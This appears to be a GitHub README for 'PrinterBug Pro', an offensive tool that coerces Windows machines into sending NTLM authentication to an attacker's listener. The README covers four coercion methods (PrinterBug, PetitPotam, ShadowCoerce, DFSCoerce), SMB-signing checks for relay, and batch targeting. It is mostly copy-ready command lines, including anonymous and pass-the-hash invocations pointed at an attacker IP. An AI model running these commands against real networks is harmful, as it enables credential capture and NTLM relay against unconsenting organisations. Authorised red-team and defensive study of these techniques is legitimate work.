# PrinterBug Pro
Enhanced multi-method Windows authentication coercion tool, fully compatible with the original `printerbug.py` while adding more features and coercion methods.
## ✨ Features
- **100% backward compatible**: All arguments and usage of the original printerbug.py are supported, drop-in replacement
- **4 built-in coercion methods**:
  - MS-RPRN (Classic PrinterBug, default)
  - MS-EFSR (PetitPotam)
  - MS-FSRVP (ShadowCoerce)
  - MS-DFSNM (DFSCoerce)
  - Auto mode: Try all methods automatically to find available one
- **Automatic SMB signing detection**: Automatically check if target enforces SMB signing, directly tell if NTLM relay is possible
- **Color-coded output**: Clear status with different colors for success/error/warning/info
- **Batch scanning support**: Load targets from file, with progress tracking
- **Improved error handling**: Clear error messages for timeout, access denied, method not supported, etc.
- **Fixed all original bugs**:
  - Fixed `KeyError: 'identity'` logging error for new impacket versions
  - Fixed `-no-ping` parameter logic inversion bug
  - Fixed incorrect ACCESS_DENIED judgment logic
  - Fixed timeout handling
- **No extra dependencies**: Only requires impacket, single file script
## 📦 Installation
```bash
# Clone the repository
git clone https://github.com/RedteamNotes/Printerbug-Pro.git
cd Printerbug-Pro
# Install dependency (impacket)
pip3 install impacket
# Or install impacket via apt on Kali
sudo apt install python3-impacket
# Make it executable
chmod +x printerbug_pro.py
```
## 🚀 Usage
### Basic syntax
```bash
python3 printerbug_pro.py [[domain/]username[:password]@]<targetIP/hostname> <attackerIP/hostname> [options]
```
### All arguments
| Argument | Description |
|----------|-------------|
| `target` | Target address, format: `[[domain/]username[:password]@]<targetName or address>` |
| `attackerhost` | Your listener IP/hostname to receive NTLM authentication |
| `--verbose` | Enable verbose debug output |
| `--method <method>` | Coercion method to use: `printerbug`(default), `petitpotam`, `shadowcoerce`, `dfscoerce`, `all` |
| **Connection options** | |
| `-target-file <file>` | File with list of targets (one per line, `#` for comments) |
| `-port <139/445>` | SMB port to connect (default: 445) |
| `-timeout <seconds>` | Connection timeout in seconds (default: 3) |
| `-no-ping` | Skip TCP ping check before connection |
| **Authentication options** | |
| `-hashes <LMHASH:NTHASH>` | NTLM hashes for authentication |
| `-no-pass` | Don't ask for password (useful for anonymous relay) |
| `-k` | Use Kerberos authentication |
| `-dc-ip <ip>` | IP address of domain controller |
| `-target-ip <ip>` | Specify target IP if using hostname |
### Common examples
```bash
# Classic PrinterBug (same as original script)
python3 printerbug_pro.py domain/user:Password123@10.10.10.10 10.10.10.20
# Use PetitPotam method
python3 printerbug_pro.py domain/user:Password123@10.10.10.10 10.10.10.20 --method petitpotam
# Auto try all available methods
python3 printerbug_pro.py domain/user:Password123@10.10.10.10 10.10.10.20 --method all
# Anonymous authentication (no credentials needed for most methods)
python3 printerbug_pro.py 'DOMAIN\'@10.10.10.10 10.10.10.20 --no-pass
# Use NTLM hash authentication
python3 printerbug_pro.py domain/user@10.10.10.10 10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
# Batch scan multiple targets from file
python3 printerbug_pro.py ''@$placeholder 10.10.10.20 -target-file targets.txt --no-pass --method all
```
## 📝 Supported Coercion Methods
| Method | Protocol | Pipe | Notes |
|--------|----------|------|-------|
| PrinterBug | MS-RPRN | `\pipe\spoolss` | Classic spooler bug, works on most Windows versions if spooler is running |
| PetitPotam | MS-EFSR | `\pipe\efsrpc` | EFS RPC method, works on most Windows versions even if spooler is disabled |
| ShadowCoerce | MS-FSRVP | `\pipe\FssagentRpc` | Shadow copy service method, works on Server versions with VSS service running |
| DFSCoerce | MS-DFSNM | `\pipe\netdfs` | DFS service method, works on domain controllers and servers with DFS role |
## ⚠️ Disclaimer
This tool is for **authorized security testing and red team operations only**. Unauthorized access to computer systems is illegal. The author is not responsible for any misuse or damage caused by this program.
## 🙏 Credits
- Original PrinterBug by [@_dirkjan](https://twitter.com/_dirkjan) (Dirk-jan Mollema)
- PetitPotam by [@topotam77](https://twitter.com/topotam77)
- ShadowCoerce by [@ShutdownRepo](https://twitter.com/ShutdownRepo)
- DFSCoerce by [@filip_dragovic](https://twitter.com/filip_dragovic)